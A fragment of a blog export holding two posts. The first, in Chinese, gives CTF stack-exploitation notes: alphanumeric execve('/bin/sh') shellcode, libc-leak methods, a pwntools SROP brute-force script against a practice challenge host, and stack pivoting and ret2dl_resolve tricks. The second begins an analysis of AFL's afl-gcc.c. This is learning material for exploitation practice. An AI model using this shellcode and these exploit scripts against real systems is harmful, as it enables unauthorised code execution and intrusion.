class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129</span></span><br><span class=\"line\"><span class=\"comment\">/* from call rax */</span></span><br><span class=\"line\">push rax</span><br><span class=\"line\">push rax</span><br><span class=\"line\">pop rcx</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* XOR pop rsi, pop rdi, syscall */</span></span><br><span class=\"line\">push <span class=\"number\">0x41413030</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor DWORD PTR [rcx+<span class=\"number\">0x30</span>], eax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* XOR /bin/sh */</span></span><br><span class=\"line\">push <span class=\"number\">0x34303041</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor DWORD PTR [rcx+<span class=\"number\">0x34</span>], eax</span><br><span class=\"line\">push <span class=\"number\">0x41303041</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor DWORD PTR [rcx+<span class=\"number\">0x38</span>], eax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* rdi = &amp;&#x27;/bin/sh&#x27; */</span></span><br><span class=\"line\">push rcx</span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor al, <span class=\"number\">0x34</span></span><br><span class=\"line\">push rax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* rdx = 0 */</span></span><br><span class=\"line\">push <span class=\"number\">0x30</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor al, <span class=\"number\">0x30</span></span><br><span class=\"line\">push rax</span><br><span class=\"line\">pop rdx</span><br><span class=\"line\"></span><br><span class=\"line\">push rax</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* rax = 59 (SYS_execve) */</span></span><br><span class=\"line\">push <span class=\"number\">0x41</span></span><br><span class=\"line\">pop rax</span><br><span class=\"line\">xor al, <span class=\"number\">0x7a</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* pop rsi, pop rdi*/</span></span><br><span class=\"line\"><span class=\"comment\">/* syscall */</span> </span><br><span class=\"line\">.byte <span class=\"number\">0x6e</span></span><br><span class=\"line\">.byte <span class=\"number\">0x6f</span></span><br><span class=\"line\">.byte <span class=\"number\">0x4e</span></span><br><span class=\"line\">.byte <span class=\"number\">0x44</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* /bin/sh */</span></span><br><span class=\"line\">.byte <span class=\"number\">0x6e</span></span><br><span class=\"line\">.byte <span class=\"number\">0x52</span></span><br><span class=\"line\">.byte <span class=\"number\">0x59</span></span><br><span class=\"line\">.byte <span class=\"number\">0x5a</span></span><br><span class=\"line\">.byte <span class=\"number\">0x6e</span></span><br><span class=\"line\">.byte <span class=\"number\">0x43</span></span><br><span class=\"line\">.byte <span class=\"number\">0x5a</span></span><br><span class=\"line\">.byte <span class=\"number\">0x41</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"0x2-2-shellcode生成工具\">0x2.2.shellcode生成工具</h4>\n<p>同时，现在有多种针对shellcode进行编码的生成工具，生成符合限制的shellcode，如msf，alpha3等等，由于我没有用过，可以自行尝试。</p>\n<h4 id=\"0x2-3-mprotect\">0x2.3.mprotect()</h4>\n<p>进一步的，很多题目没有天然的readable  and  executable segment，题目可能通过mmap()映射了一段权限为7的段，或者存在mprotect()函数。</p>\n<p>这个函数可以修改指定内存段的权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mprotect:</span><br><span class=\"line\">int mprotect(void *addr, size_t len, int prot);</span><br><span class=\"line\">addr 内存起始地址</span><br><span class=\"line\">len  修改内存的长度</span><br><span class=\"line\">prot 内存的权限，7为可读可写可执行</span><br></pre></td></tr></table></figure>\n<p>如果存在这样的函数，可以考虑将其加入ROP链，从而进一步调用shellcode</p>\n<h3 id=\"0x3-ret2libc\">0x3.ret2libc</h3>\n<h4 id=\"0x3-1-leak-libc\">0x3.1.leak_libc</h4>\n<p>对于最后调用 libc 中 system 的题目而言，需要考虑的首要问题就是leak_libc.</p>\n<p>目前而言，我遇到的栈题中leak_libc，有两种方法：</p>\n<ol>\n<li>partial_overwrite<br>\n有时候，在栈中会存留libc中地址，在后面存在直接输出的函数的情况下，可以带出此地址。</li>\n<li>通过puts，write等函数，打印<code>.got</code>，获取对应函数的地址，这里，在没有给定对应libc版本的情况下，也可以通过LibcSearcher查找对应libc版本</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ref:  https://github.com/lieanu/LibcSearcher</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class=\"line\">obj = LibcSearcher(<span class=\"string\">&quot;fgets&quot;</span>, <span class=\"number\">0X7ff39014bd90</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">obj.dump(<span class=\"string\">&quot;system&quot;</span>)        <span class=\"comment\">#system 偏移</span></span><br><span class=\"line\">obj.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)    <span class=\"comment\">#/bin/sh 偏移</span></span><br><span class=\"line\">obj.dump(<span class=\"string\">&quot;__libc_start_main_ret&quot;</span>)    </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h4 id=\"0x3-2-partial-overwrite\">0x3.2.partial_overwrite</h4>\n<h5 id=\"1-前置知识\">(1)前置知识</h5>\n<p>针对没有泄露的赛题，可以考虑partial_overwrite改写<code>got</code>表，实现system，因为一般而言，大部分libc函数，里面都存在syscall，所以syscall偏移和函数head_addr差别不会太大。</p>\n<p>考虑对于一个<code>got</code>表中的64位地址:  0xXXXXXXXXXXXXX， 假设其附近的syscall地址后三位偏移为0xaaa(请确定这个偏移和got内函数偏移只有最后四个16位数字不同)， 因为libc装载地址以页为单位，后三位是确定0x000，那么partial_overwrite覆盖后面两个字节， 即覆盖<code>got</code>为0xXXXXXXXXfaaa，那么有1/16的几率恰好syscall</p>\n<h5 id=\"2-爆破脚本写法\">(2)爆破脚本写法</h5>\n<p>一个爆破脚本模板:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\">elf =<span class=\"string\">&#x27;./ciscn_s_3&#x27;</span></span><br><span class=\"line\">remote_add = <span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class=\"line\">remote_port = <span class=\"number\">29554</span></span><br><span class=\"line\"></span><br><span class=\"line\">main_add = <span class=\"number\">0x40051d</span></span><br><span class=\"line\">off = <span class=\"number\">0x130</span></span><br><span class=\"line\">system_add = <span class=\"number\">0x400517</span></span><br><span class=\"line\">rtframe = <span class=\"number\">0x4004da</span></span><br><span class=\"line\">ret_add = <span class=\"number\">0x4004e9</span></span><br><span class=\"line\"></span><br><span class=\"line\">i = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> i &lt; <span class=\"number\">20</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">        context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> sys.argv[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;r&#x27;</span>:</span><br><span class=\"line\">            p = remote(remote_add, remote_port, timeout = <span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> sys.argv[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;d&#x27;</span>:</span><br><span class=\"line\">            p = gdb.debug(elf)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            p = process(elf, timeout = <span class=\"number\">1</span>)</span><br><span class=\"line\">        payload1 = <span class=\"string\">b&#x27;/bin/sh\\0&#x27;</span> + cyclic(<span class=\"number\">0x8</span>)</span><br><span class=\"line\">        payload1+= p64(main_add)</span><br><span class=\"line\"></span><br><span class=\"line\">        p.sendline(payload1)</span><br><span class=\"line\"></span><br><span class=\"line\">        stack_add = u64(p.recv(<span class=\"number\">0x28</span>)[-<span class=\"number\">8</span>::]) - off</span><br><span class=\"line\"></span><br><span class=\"line\">        frame = SigreturnFrame()</span><br><span class=\"line\">        frame.rax = <span class=\"number\">0x3b</span></span><br><span class=\"line\">        frame.rdi = stack_add</span><br><span class=\"line\">        frame.rsi = <span class=\"number\">0</span></span><br><span class=\"line\">        frame.rdx = <span class=\"number\">0</span></span><br><span class=\"line\">        frame.rsp = stack_add</span><br><span class=\"line\">        frame.rip = system_add</span><br><span class=\"line\"></span><br><span class=\"line\">        payload = <span class=\"string\">b&#x27;/bin/sh\\0&#x27;</span> + cyclic(<span class=\"number\">0x8</span>)</span><br><span class=\"line\">        payload+= p64(rtframe)</span><br><span class=\"line\">        payload+= p64(system_add)</span><br><span class=\"line\">        payload+= <span class=\"built_in\">bytes</span>(frame)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">#p.sendline(&#x27;a&#x27;)</span></span><br><span class=\"line\">        <span class=\"comment\">#p.recvuntil(&#x27;\\0&#x27;)</span></span><br><span class=\"line\">        p.sendline(payload)</span><br><span class=\"line\">        p.recvuntil(<span class=\"string\">&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">        p.sendline(<span class=\"string\">&#x27;cat flag&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(p.recvline())</span><br><span class=\"line\">        </span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">    <span class=\"keyword\">except</span> BaseException <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\"></span><br><span class=\"line\">    off+=<span class=\"number\">0x8</span></span><br><span class=\"line\">    i+=<span class=\"number\">1</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>核心模板:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> True:</span><br><span class=\"line\">    try:</span><br><span class=\"line\">\t\t<span class=\"comment\">// p = process()</span></span><br><span class=\"line\">\t\t<span class=\"comment\">// pass</span></span><br><span class=\"line\">        p.sendline(<span class=\"string\">&#x27;cat flag&#x27;</span>)</span><br><span class=\"line\">        print(p.recvline())</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">    except BaseException as e:</span><br><span class=\"line\">        p.close()</span><br><span class=\"line\">    <span class=\"comment\">// pass</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>采用grep 获取输出包含flag的行就行</p>\n<h4 id=\"0x3-3-ret2dl-resolve\">0x3.3.ret2dl_resolve()</h4>\n<p>延迟绑定会使用_dl_resolve()函数</p>\n<ul>\n<li>\n<p>_dl_resolve中</p>\n<p>_dl_resolve调用_dl_fixup, _dl_dixup流程：</p>\n<ol>\n<li>通过link_map 获得.dynsym、.dynstr、.rel.plt地址</li>\n<li>通过reloc_offset + ret.plt地址获得函数对应的Elf64_Rel指针</li>\n<li>通过&amp;(ELF64_Rel)-&gt;r_info 和.dynsym取得对应Elf64_Sym指针</li>\n<li>检查r_info</li>\n<li>检查&amp;(Elf64_Sym)-&gt;st_other</li>\n<li>通过strtab(DT_STRTAB中的地址)+st_name(.dymsym中的偏移)获得函数对应的字符串，进行查找，找到后赋值给rel_addr,最后调用这个函数</li>\n</ol>\n</li>\n</ul>\n<p>综合而言，有如下利用方法(参考CTF-wiki，主要是第三种，因为存在信息泄露时，可用其他方法)</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\"></th>\n<th style=\"text-align:left\">修改 dynamic 节的内容</th>\n<th style=\"text-align:left\">修改重定位表项的位置</th>\n<th style=\"text-align:left\">伪造 linkmap</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">主要前提要求</td>\n<td style=\"text-align:left\">无</td>\n<td style=\"text-align:left\">无</td>\n<td style=\"text-align:left\">无信息泄漏时需要 libc</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">适用情况</td>\n<td style=\"text-align:left\">NO RELRO</td>\n<td style=\"text-align:left\">NO RELRO, Partial RELRO</td>\n<td style=\"text-align:left\">NO RELRO, Partial RELRO</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">注意点</td>\n<td style=\"text-align:left\"></td>\n<td style=\"text-align:left\">确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应</td>\n<td style=\"text-align:left\">确保重定位位置可写；需要着重伪造重定位表项、符号表；</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"0x4-Tricks\">0x4.Tricks</h3>\n<h4 id=\"0x4-1-stack-pivoting\">0x4.1.stack pivoting</h4>\n<p>栈迁移技巧， 主要针对可溢出字节较少的情况，通过<code>leave</code>此类指令控制rsp</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">;leave 相当于:</span><br><span class=\"line\">mov rsp,rbp</span><br><span class=\"line\">pop rbp</span><br><span class=\"line\">;那么考虑将栈帧中rbp地址改为栈迁移目的地址</span><br><span class=\"line\">;leave两次之后，就可以将栈转移到目的地址</span><br><span class=\"line\">;同时要现在目的地址布置好fake_stack</span><br></pre></td></tr></table></figure>\n<p>可以知道，栈迁移的前提在于，需要提前布置好栈帧，即在.bss ，  或者.data等段写入，一般要求前面有读取到.data段的函数</p>\n<p>不过，现在栈迁移一般会稍微复杂一些，读取类函数(如read)和leave可能在一个栈帧，这就要求我们在劫持read写入到指定地址的同时，实现分段栈迁移，大致流程如下:</p>\n<ul>\n<li>在第一次read读入后将rbp改为要写入的位置</li>\n<li>ret到read</li>\n<li>第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8</li>\n<li>这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置</li>\n</ul>\n<h4 id=\"0x4-2-栈对齐\">0x4.2.栈对齐</h4>\n<p>栈对齐是高版本Ubuntu的一个特性，网上对于这个特性的解释很多都是错误的，还把它与栈平衡搞混了。</p>\n<p>这个特性来源于新版本xmm相关指令需要内存对齐，当程序运行到这些指令时，如果内存不是16位对齐，就会直接coredump</p>\n<p>可以:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ gdb -c core</span><br></pre></td></tr></table></figure>\n<p>调试core文件</p>\n<p>如果终止指令类似于:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">► <span class=\"number\">0x7fa8677a3396</span>    movaps xmmword ptr [rsp + <span class=\"number\">0x40</span>], xmm0</span><br></pre></td></tr></table></figure>\n<p>说明是栈对齐的原因，小心调整栈帧就行</p>\n<h4 id=\"0x4-3-Stack-smash\">0x4.3.Stack smash</h4>\n<p>对于某些将flag装载到内存，并且知道flag的地址、开启了cannary的题目而言，可以考虑stack_smash。</p>\n<p>在开启cannary 防护的题目中，检测到栈溢出后，会调用 <code>__stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串，而这个地址可以被覆盖，因此，可以利用此实现泄露flag</p>\n<h4 id=\"0x4-4-SROP\">0x4.4.SROP</h4>\n<h5 id=\"1-前置知识-2\">(1)前置知识:</h5>\n<p>在进程接收到signal时，内核会将其上下文保存位sigFrame，然后进入signal_handle，对信号处理，返回后，会执行sigreturn调用，恢复保存Frame，主要包括寄存器和控制流(rip，rsp)的一些设置。</p>\n<p>那么，当我们伪造一个Frame，并且触发sigreturn调用时，就能控制寄存器和控制流，这也就是SROP的本质。</p>\n<p>同一般rop链相比，可以自由控制rax，进一步的，可以自由控制系统调用，所以SROP拓展了ROP的attack methods。</p>\n<p>SROP简要流程:</p>\n<ol>\n<li>构造fake_frame</li>\n<li>控制当前rsp指向fake_frame底部</li>\n<li>sigreturn调用</li>\n</ol>\n<p>sigFrame结构如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// x64</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpstate</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"comment\">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class=\"line\">  <span class=\"type\">__uint16_t</span>        cwd;</span><br><span class=\"line\">  <span class=\"type\">__uint16_t</span>        swd;</span><br><span class=\"line\">  <span class=\"type\">__uint16_t</span>        ftw;</span><br><span class=\"line\">  <span class=\"type\">__uint16_t</span>        fop;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span>        rip;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span>        rdp;</span><br><span class=\"line\">  <span class=\"type\">__uint32_t</span>        mxcsr;</span><br><span class=\"line\">  <span class=\"type\">__uint32_t</span>        mxcr_mask;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpxreg</span>    _<span class=\"title\">st</span>[8];</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">xmmreg</span>    _<span class=\"title\">xmm</span>[16];</span></span><br><span class=\"line\">  <span class=\"type\">__uint32_t</span>        padding[<span class=\"number\">24</span>];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">sigcontext</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r8;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r9;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r10;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r11;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r12;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r13;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r14;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> r15;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rdi;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rsi;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rbp;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rbx;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rdx;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rax;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rcx;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rsp;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> rip;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> eflags;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">short</span> cs;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">short</span> gs;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">short</span> fs;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">short</span> __pad0;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> err;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> trapno;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> oldmask;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> cr2;</span><br><span class=\"line\">  __extension__ <span class=\"class\"><span class=\"keyword\">union</span></span></span><br><span class=\"line\"><span class=\"class\">    &#123;</span></span><br><span class=\"line\">      <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">fpstate</span> * <span class=\"title\">fpstate</span>;</span></span><br><span class=\"line\">      <span class=\"type\">__uint64_t</span> __fpstate_word;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  <span class=\"type\">__uint64_t</span> __reserved1 [<span class=\"number\">8</span>];</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h5 id=\"2-pwntools-srop\">(2)pwntools.srop</h5>\n<p>pwntools集成了SROP的模块，可以帮助制作fake_frame:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 一个简单的例子</span><br><span class=\"line\">sigframe = SigreturnFrame()</span><br><span class=\"line\">sigframe.rax = constants.SYS_read</span><br><span class=\"line\">sigframe.rdi = <span class=\"number\">0</span></span><br><span class=\"line\">sigframe.rsi = stack_addr</span><br><span class=\"line\">sigframe.rdx = <span class=\"number\">0x400</span></span><br><span class=\"line\">sigframe.rsp = stack_addr</span><br><span class=\"line\">sigframe.rip = syscall_ret</span><br></pre></td></tr></table></figure>\n"},{"title":"Source-Code-Analysis-of-AFL-[1]-code-instrumentation","date":"2022-06-30T16:00:00.000Z","toc":true,"sidebar":"none","_content":"\n\n\n\n\n\n\nAFL源代码阅读[1]， 主要包含对afl-gcc.c 和afl-as.c的流程分析，也即插桩的过程。而插桩后进程间通信的过程相对复杂，将在后面单独分析。\n\n# 0x1 文件依赖结构\n\n基本文件结构: \n\n- **afl-as.c、afl-as.h、afl-gcc.c** :普通的代码插桩\n- **afl-fuzz.c** \n  fuzzer实现代码 核心\n- llvm_mode \n  llvm模式进行插桩，仅clang适用\n- qemu_mode \n  qemu模式插桩，针对二进制文件\n- libdislocator \n  简单的内存检测工具\n- libtokencap \n  语法关键字提取并生成字典文件\n- afl-analyze.c \n  对测试样例的字典进行分析\n- afl_cmin \n  对fuzzing用到的语料库进行精简操作\n- afl_tmin.c \n  对fuzzing中用到的测试用例进行最小化操作\n- afl-gotcpu.c \n  统计cpu占用率\n- afl-plot \n  绘制报告图标\n- afl-showmap.c \n  打印目标程序fuzz后的tuple信息\n- afl-whatsup \n  并行fuzz结果统计\n- alloc-inl.h \n  定义带检测功能的内存分配和释放操作\n- Hash.h \n  hash函数的实现和定义\n- test-instr.c \n  测试的目标程序\n- dos\n  相关说明文档\n- experimental \n  一些新特性的试验研究\n\n\n\n# 0x2 基本模块分析\n\n## (1)代码插桩\n\n基本流程: afl-gcc  -->  afl-as \n\n### afl-gcc.c\n\n#### 0x1.基础变量\n\n| name                       | meaning                            |\n| -------------------------- | ---------------------------------- |\n| static u8*  as_path        | *Path to the AFL 'as' wrapper*     |\n| static u8** cc_params      | *Parameters passed to the real CC* |\n| static u32  cc_par_cnt = 1 | *Param count, including argv0*     |\n| static u8  be_quiet        | *Quiet mode*                       |\n| static u8 clang_mode       | *Invoked as afl-clang?*            |\n\n\n\n#### 0x2.main函数核心流程\n\na.检查是否是静默模式\n\n```c\nif (isatty(2) && !getenv(\"AFL_QUIET\")) {\n\nSAYF(cCYA \"afl-cc \" cBRI VERSION cRST \" by <lcamtuf@google.com>\\n\");\n\n} else be_quiet = 1;\n```\n\nb. 检查参数是否完备\n\n```c\nif (argc < 2) {\n\nSAYF(\"\\n\"\n     \"This is a helper application for afl-fuzz. It serves as a drop-in replacement\\n\"\n     \"for gcc or clang, letting you recompile third-party code with the required\\n\"\n     \"runtime instrumentation. A common use pattern would be one of the following:\\n\\n\"\n\n     \"  CC=%s/afl-gcc ./configure\\n\"\n     \"  CXX=%s/afl-g++ ./configure\\n\\n\"\n\n     \"You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\\n\"\n     \"Setting AFL_HARDEN enables hardening optimizations in the compiled code.\\n\\n\",\n     BIN_PATH, 